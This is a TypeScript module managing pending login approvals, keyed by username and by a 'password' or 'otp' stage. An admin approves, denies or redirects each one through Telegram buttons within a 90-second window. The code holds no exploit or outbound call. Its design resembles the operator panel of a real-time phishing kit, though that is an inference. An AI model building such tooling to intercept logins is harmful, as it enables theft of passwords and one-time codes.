/**
 * Approval Webhook System
 * Manages pending approvals (Approve, Deny, Redirect) with 90-second timeout
 * Integrated with Telegram bot buttons for admin decisions
 */

import crypto from "crypto"

export type ApprovalAction = "approve" | "deny" | "redirect"

export interface ApprovalRequest {
  id: string
  username: string
  stage: "password" | "otp" // When approval is needed
  createdAt: number
  expiresAt: number
  action?: ApprovalAction
  decidedAt?: number
}

export interface ApprovalResponse {
  approved: boolean
  action?: ApprovalAction
  message?: string
  waitingFor?: number // milliseconds remaining
}

// In-memory store for pending approvals (in production, use Redis/DB)
const APPROVALS = new Map<string, ApprovalRequest>()

// Time limit for approval decision (seconds)
const APPROVAL_TIMEOUT = 90

/**
 * Generate unique approval ID
 */
function generateApprovalId(): string {
  return crypto.randomBytes(16).toString("hex")
}

/**
 * Create a new approval request
 */
export function createApprovalRequest(
  username: string,
  stage: "password" | "otp"
): ApprovalRequest {
  const id = generateApprovalId()
  const now = Date.now()
  const request: ApprovalRequest = {
    id,
    username,
    stage,
    createdAt: now,
    expiresAt: now + APPROVAL_TIMEOUT * 1000,
  }

  APPROVALS.set(id, request)

  // Auto-cleanup after timeout
  setTimeout(() => {
    if (APPROVALS.has(id)) {
      const req = APPROVALS.get(id)!
      if (!req.action) {
        // Auto-deny if no decision made
        req.action = "deny"
        req.decidedAt = Date.now()
      }
    }
  }, APPROVAL_TIMEOUT * 1000)

  return request
}

/**
 * Check approval status
 */
export function checkApprovalStatus(approvalId: string): ApprovalResponse {
  const request = APPROVALS.get(approvalId)

  if (!request) {
    return {
      approved: false,
      message: "Approval request not found",
    }
  }

  const now = Date.now()

  // Approval decision already made
  if (request.action) {
    return {
      approved: request.action === "approve",
      action: request.action,
      message:
        request.action === "approve"
          ? "✅ Approved - proceeding..."
          : request.action === "deny"
            ? "❌ Denied - access blocked"
            : "🔄 Redirecting...",
    }
  }

  // Check if expired
  if (now > request.expiresAt) {
    request.action = "deny"
    request.decidedAt = now
    return {
      approved: false,
      action: "deny",
      message: "⏰ Approval timeout - access denied",
    }
  }

  // Still waiting
  const remaining = request.expiresAt - now
  return {
    approved: false,
    waitingFor: remaining,
    message: `⏳ Awaiting approval... ${Math.ceil(remaining / 1000)}s`,
  }
}

/**
 * Process approval decision from webhook/button
 */
export function processApprovalDecision(
  approvalId: string,
  action: ApprovalAction
): ApprovalResponse {
  const request = APPROVALS.get(approvalId)

  if (!request) {
    return {
      approved: false,
      message: "Approval request not found or expired",
    }
  }

  if (request.action) {
    return {
      approved: request.action === "approve",
      action: request.action,
      message: "Decision already made",
    }
  }

  request.action = action
  request.decidedAt = Date.now()

  return {
    approved: action === "approve",
    action,
    message:
      action === "approve"
        ? "✅ Approved"
        : action === "deny"
          ? "❌ Denied"
          : "🔄 Redirecting",
  }
}

/**
 * Get approval request details (for Telegram webhook)
 */
export function getApprovalRequest(approvalId: string): ApprovalRequest | null {
  return APPROVALS.get(approvalId) || null
}

/**
 * Clean up expired approvals
 */
export function cleanupExpiredApprovals(): number {
  let cleaned = 0
  const now = Date.now()

  for (const [id, request] of APPROVALS.entries()) {
    if (now > request.expiresAt && !request.action) {
      APPROVALS.delete(id)
      cleaned++
    }
  }

  return cleaned
}

/**
 * Get all pending approvals (for admin dashboard)
 */
export function getPendingApprovals(): ApprovalRequest[] {
  const now = Date.now()
  return Array.from(APPROVALS.values()).filter(
    (req) => !req.action && now <= req.expiresAt
  )
}

export default {
  createApprovalRequest,
  checkApprovalStatus,
  processApprovalDecision,
  getApprovalRequest,
  cleanupExpiredApprovals,
  getPendingApprovals,
}
